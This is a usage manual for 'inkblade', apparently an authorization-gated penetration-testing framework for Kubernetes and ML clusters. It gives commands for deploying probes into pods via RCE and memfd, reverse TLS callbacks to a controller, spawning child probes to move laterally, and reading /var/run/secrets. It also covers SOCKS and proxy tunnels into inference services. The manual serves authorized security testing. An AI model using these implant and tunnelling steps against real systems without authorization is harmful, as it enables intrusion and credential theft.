# Usage / 使用手册

> 路径：接入 → 授权 → 会话 → 探针 → 检测 → 横向 → 报告。
> 目标侧执行体：Rust 探针。模板是数据；控制端 Python 不进入目标 Pod。

## 快速参考

`inkblade up` 打开接入向导；`quickstart` 签授权记录；`session open` 绑定目标；`probe deploy` 投放探针；`session run`、`run`、`execute` 与 `agent run` 执行检测；`report` 出双语报告。每一步的输出都是下一步的输入。

## 先理解六个对象

一次测试由六样东西串起来：

- `session`：授权容器，记录入口方式、目标、命名空间、Pod、凭据指纹和证据目录。
- `probe`：目标 Pod 里的 Rust 执行体，有 `probe_id` 和 `parent_id`。
- `template`：声明式检测程序，含 steps、checks、findings、artifacts。
- `task`：一次模板执行。
- `run`：一次项目运行的证据根；`agent` 与 `execute` 都写入 run。
- `evidence`：结果、日志、产物与 manifest。

一个 session 可以有多棵探针树，一个探针可以跑多个模板，一个模板可以产生多条 finding，每条 finding 必须指向一个 task + step。

## 接入与授权

```bash
python -m pip install -e .
python -m inkblade up --no-consent
```

`up` 创建工作区、打印一次性 admin 密码，并在 `127.0.0.1:8765` 提供本地控制台；浏览器登录。首次投放前用 `inkblade quickstart` 或控制台的授权页签署记录：目标、范围、级别、用户、时间窗。记录是哈希钉存的；`inkblade roe` 随时查看当前授权状态。

级别共四档：`read-only`、`active-probe`、`exploit-verify`、`full-impact`。模板的 `min_level` 高于会话级别时会被拒绝，不会“先跑跑看”。时间窗过期即拒绝。

## 三种入口

| 入口 | 适用场景 | kubeconfig |
|---|---|---|
| `foothold` | 已有 Pod shell、ServiceAccount token 或授权 RCE；用已有凭据投放第一颗探针 | 不需要 |
| `external` | 目标可达，先提交有界可达性/版本/路由证明，再经授权 RCE 或回调投放探针 | 不需要 |
| `kubeconfig` | 可选的首次批量 bootstrap，一次给多个 Pod 投放探针 | 可选 |

`foothold` 与 `external` 都不需要 kubeconfig；`kubeconfig` 只用于你有运维凭据并且想批量投放的场景。

## 已有探针接入

默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。探针主动回连控制端：

```bash
python -m inkblade channel listen \
  --bind 0.0.0.0 --port 9443 --transport tls \
  --token-file ./probe.token --workspace local-lab
```

在 Pod 内让探针主动回连（`channel listen` 会输出 `ca.pem` 与 pin）：

```bash
./inkblade-probe reverse \
  --transport tls \
  --host <controller> --port 9443 \
  --ca-file ca.pem --pin <sha256> --sni <name> \
  --token-file /tmp/probe.token \
  --probe-id pod-a
```

`probe list` 列出工作区里已登记的探针（`probe_id`、父探针、状态、目标）。`channel listen` 等待探针连接；子探针由父探针用 `probe upload` + `probe spawn` 投放，并以同样方式回连。存在本地命令通道时仍可用 stdio 通道（`channel start --session <id>`）；SOCKS5 与端口转发只绑 `127.0.0.1`。已有探针不需要重新投放，也不需要 kubeconfig。

## 首次投放

已有立足点时：

```bash
python -m inkblade session open \
  --mode foothold \
  --target <target> \
  --credential-source pod-shell \
  --namespace <namespace> \
  --pod <pod>

python -m inkblade probe deploy \
  --session <session-id> \
  --via rce \
  --binary ./inkblade-probe-linux-amd64 \
  --probe-token-file ./probe.token \
  --allow-write
```

随后在 Pod 内让探针回连控制端：

```bash
./inkblade-probe reverse \
  --transport tls \
  --host <controller> --port 9443 \
  --ca-file ca.pem --pin <sha256> --sni <name> \
  --token-file /tmp/probe.token \
  --probe-id pod-a
```

`--credential-source` 可取 `pod-shell`、`sa-token` 或 `rce`；`--via` 用 `rce` 或 `sa-token` 投放。`--via rce` 适合非 root、无 hostPath/privileged 的低权限 Pod。没有 shell、只有可达服务时，先用 `session open --mode external --target <target> --proof @proof.json` 建立有界证明，再经授权 RCE/回调投放。

## 会话

```bash
python -m inkblade session status
python -m inkblade session status --id <session-id>
python -m inkblade session close --id <session-id>
```

`--credential-source` 与 `--token-file` 用于记录凭据来源和读取 token；会话只保存 SHA-256 指纹，不保存凭据本身。`kubeconfig` 模式是可选的高级路径，用于首次批量投放，详见 [`QUICKSTART.md`](QUICKSTART.md)。

## 探针

```bash
python -m inkblade probe deploy \
  --session <session-id> \
  --via sa-token \
  --binary ./inkblade-probe-linux-amd64 \
  --token-file ./sa.token \
  --probe-token-file ./probe.token \
  --allow-write

python -m inkblade probe list --session <session-id>
python -m inkblade probe collect --session <session-id> --probe-id <probe-id>
python -m inkblade probe cleanup --session <session-id> --probe-id <probe-id>
```

`--via` 有四种：

- `sa-token`：用已有 ServiceAccount token 投放，不需要 kubeconfig。
- `rce`：已有授权代码执行入口时，用 base64 + memfd 投放，不需要 kubeconfig。
- `manifest`：生成 Pod、Job 或 EphemeralContainer 清单，`--apply` 时才提交；有 kubeconfig 时可作为批量 bootstrap。
- `kubectl`：可选的高级路径，有 pods/exec 与 kubeconfig 时一次投放多个 Pod。

不带 `--allow-write` 时 `probe deploy` 只输出计划。投放后先 `probe list` 和 `probe collect`，确认目标、容器、只读状态、父子关系与快照一致，再跑检测。

常用动作：

```bash
python -m inkblade probe exec --session <session-id> --probe-id <probe-id> -- id
python -m inkblade probe read-file --session <session-id> --probe-id <probe-id> /etc/hosts
python -m inkblade probe list-files --session <session-id> --probe-id <probe-id> /var/run/secrets
python -m inkblade probe upload --session <session-id> --probe-id <probe-id> ./local.bin /tmp/local.bin
python -m inkblade probe download --session <session-id> --probe-id <probe-id> /tmp/out.bin ./out.bin
```

## 通道

默认是探针主动回连的反向通道：控制端 `channel listen`，Pod 内探针 `reverse`。存在本地命令通道时，可用 stdio 通道：

```bash
python -m inkblade channel start --session <session-id> --socks-port 1080
python -m inkblade channel start --session <session-id> \
  --forward 8080:infer-0.ml-team:8000
python -m inkblade channel status
python -m inkblade channel stop
```

stdio 通道用探针 stdio 承载帧协议。SOCKS5 只是**本地兼容代理**，只绑定
`127.0.0.1`，不提供对外认证或 TLS；端口转发同样只用于本地 loopback。
不要用 SOCKS5/本地端口转发跨越不受信网络。反向通道由 Pod 主动发起出站连接，
不需要 Pod 监听端口，适合最低权限、只有出站 TCP 的立足点。

ML 原生代理优先使用协议自身形态，本地客户端侧 TLS，控制器到探针走已加密
的 reverse 传输（P1 需要安装可选依赖 h2）：

```bash
# P1: gRPC over TLS（Triton 8001 / Ray 8265），token 放 gRPC metadata
python -m inkblade channel proxy --protocol grpc \
  --target triton-0.ml-team:8001 --token-file ./proxy.token \
  --probe-command '<kubectl exec -i ... -- probe run --stdio ...>' \
  --tls-dir ./evidence/local-lab/reverse/mlproxy-tls

# P2: Redis RESP over TLS（Ray GCS 6379），客户端 AUTH <token>
python -m inkblade channel proxy --protocol redis \
  --target ray-head.ml-team:6379 --token-file ./proxy.token \
  --probe-command '<kubectl exec -i ... -- probe run --stdio ...>'

# P4: TCPStore/Gloo TLS relay（PyTorch 29500），HMAC preamble
python -m inkblade channel proxy --protocol tcpstore \
  --target ray-head.ml-team:29500 --token-file ./proxy.token \
  --probe-command '<kubectl exec -i ... -- probe run --stdio ...>'

# P6: NCCL/UCX TCP 控制流 profile（不冒充 RDMA verbs）
python -m inkblade channel proxy --protocol nccl \
  --target worker-0.ml-team --port 50000-51000 \
  --token-file ./proxy.token \
  --probe-command '<kubectl exec -i ... -- probe run --stdio ...>'
```

`channel proxy` 默认只监听 `127.0.0.1`；`--tls-dir` 输出 CA、服务器证书和
pin，客户端必须用 pin 校验。token 文件权限需为 `0600`，不写入状态或日志。
P1/P2/P4/P6 已实现；P3（ZMTP+CURVE）为 technical-infeasible（见
`REVERSE-CHANNEL.md`，未注册假实现），P5（MASQUE CONNECT-UDP）不在本任务
范围。P6 只做 TCP 控制流加密 relay、端口映射、保活和抖动统计，不实现也不
冒充 IB/RoCE/UCX/RDMA verbs。跨集群/远端代理必须使用 `tls`、`wss` 或
`https` 的 reverse 探针，禁止明文 `tcp`。

## 检测

单模板：

```bash
python -m inkblade session run --id <session-id> --module service-account-token-exposure
python -m inkblade run --module prefix-cache-cross-tenant-leak \
  --params '{"target":"infer-0.ml-team:8000","tenant":"a","other":"b"}'
```

链执行：

```bash
python -m inkblade execute --chain <chain-id> --dry-run
python -m inkblade execute --chain <chain-id>
```

Agent：

```bash
python -m inkblade agent run \
  --probe <probe-id> \
  --objective read-only-recon \
  --workspace ./work \
  --budget-steps 40 \
  --budget-actions 20
```

`agent run` 打印 `run_id`。运行中可查状态与决策：

```bash
python -m inkblade agent status --run-id <run-id>
python -m inkblade agent trace --run-id <run-id>
python -m inkblade agent stop --run-id <run-id>
```

`agent resume` 从持久 journal 恢复；`agent replay` 零执行回放事件、图和预算。

`--params` 是 JSON，也可以 `@params.json` 从文件读。模板的 `inputs` 从 `params` 解析；必填缺失返回 `skipped`。写模板必须 `backup-write` 模式且有备份回执。

## 多探针与横向

```bash
python -m inkblade probe spawn <probe-binary> \
  --session <session-id> \
  --parent-id <parent-probe-id> \
  --target-namespace ml-team \
  --target-pod infer-1 \
  --via k8s-exec

python -m inkblade probe list --session <session-id> --json
python -m inkblade probe cleanup --session <session-id> --probe-id <parent-probe-id>
```

子探针继承父探针的只读、白名单和预算，只能更严格。跨 namespace 需要 session 范围覆盖，否则拒绝。清理先子后父；`probe cleanup` 默认递归。

## 跨集群

```bash
python -m inkblade agent relay add --name cluster-b --endpoint <endpoint>
python -m inkblade agent relay list
python -m inkblade agent relay status
python -m inkblade agent coverage status --run-id <run-id>
python -m inkblade agent coverage proof --run-id <run-id>
```

中继承载同一套帧协议；每个集群仍然需要自己的授权记录。`coverage proof` 写出目标图的闭合情况，随报告一起交付。

## 报告与导出

```bash
python -m inkblade report --run <run-id> --lang bi --kind pentest
python -m inkblade report --run <run-id> --lang zh --kind remediation --format md
python -m inkblade export --run <run-id> --format sarif
python -m inkblade export --run <run-id> --format ocsf
python -m inkblade export --run <run-id> --format vex
```

报告包含范围与授权、探针树、按层发现、组合链、盲区、修复建议与覆盖证明。探针树要能看到投放方式、父子关系、清理状态；发现要带证据锚；盲区要写清缺少什么部署面。没有证据的 finding 不生成。

## 规则包

```bash
python -m inkblade rules generate --out ./rules
python -m inkblade rules validate --findings <findings.json>
```

规则包来源要对应盲区：Kyverno/Gatekeeper 管准入豁免、Audit、mutation 与子资源；Sigma 管进程、文件、DNS、改名执行；Falco/Tetragon 管 syscall、容器逃逸、敏感路径；Suricata/WAF 管编码、分块、Unicode、超长请求。`rules validate` 输出拦截 / 检出 / 漏过矩阵。

## 控制台

```bash
python -m inkblade ui --port 8765
```

控制台默认绑 `127.0.0.1`，展示工作区里的会话、探针树、发现、图与时间线。容器或反向代理后才用 `--host 0.0.0.0`。

## 读结果

一个结果至少有 `status`、`steps`、`checks`、`findings`、`artifacts`。

- `status=ok`：模板跑完、没有 finding；不代表目标安全，可能只是没命中。
- `status=findings`：有发现，先看 severity 与 evidence，再看 checks 是否支持。
- `status=skipped`：输入缺失、部署面不存在或写步骤被只读跳过。
- `status=error`：看 `error.code` 与 `error.step`。

证据锚有五种：`task:<id>`、`step:<id>`、`artifact:<name>`、`probe:<id>`、`manifest:<sha256>`。报告里每条 finding 至少带一个证据锚。

## 退出码

| 码 | 含义 |
|---|---|
| 0 | 成功；可能有 findings |
| 1 | 参数/配置错误 |
| 2 | 模板/验证失败 |
| 3 | 部分失败，但报告已生成 |
| 4 | 授权/范围/时间窗拒绝 |
| 5 | 探针不可用/握手失败 |
| 6 | 证据/manifest 校验失败 |
| 91 | 写闸门拒绝（备份/授权/只读） |

CI 里建议把 4、5、6、91 当硬失败；0 和 3 由策略决定。

## 排障

- `E_AUTH`：查 token 文件权限、是否为空、父子 token 是否混用。
- `E_FRAME`：多半是 stdin/stdout 被 shell banner 或 TTY 污染。
- `E_TIMEOUT`：查目标可达性、模板总超时、探针 CPU 配额。
- `E_DENIED`：查只读模式、命令白名单、模板是否声明 write。
- `E_K8S`：查 SA token、RBAC、API server 地址、镜像里有没有 kubectl。
- `E_DEPLOY`：查架构、可写路径、noexec、memfd。
- `E_HASH`：查传输截断、块顺序、SHA256SUMS 版本。
- `skipped`：查输入缺失、部署面不存在、只读跳过写。

## English summary

Start with `inkblade up`, sign the authorization record with `quickstart`, open a session with an explicit entry mode, deliver the static probe, then run one template with `session run`, a chain with `execute`, or an objective graph with `agent run`. `report` renders the bilingual pentest and remediation output; `export` produces SARIF, OCSF and VEX; `rules generate` and `rules validate` close the loop with replayable packs. Probe trees are explicit, writes pass five gates, and every finding resolves to an evidence anchor.

Protocol frames and deployment prerequisites: [`PROBE-PROTOCOL.md`](PROBE-PROTOCOL.md), [`PROBE-DEPLOY.md`](PROBE-DEPLOY.md), [`PROBE-CHANNEL.md`](PROBE-CHANNEL.md).
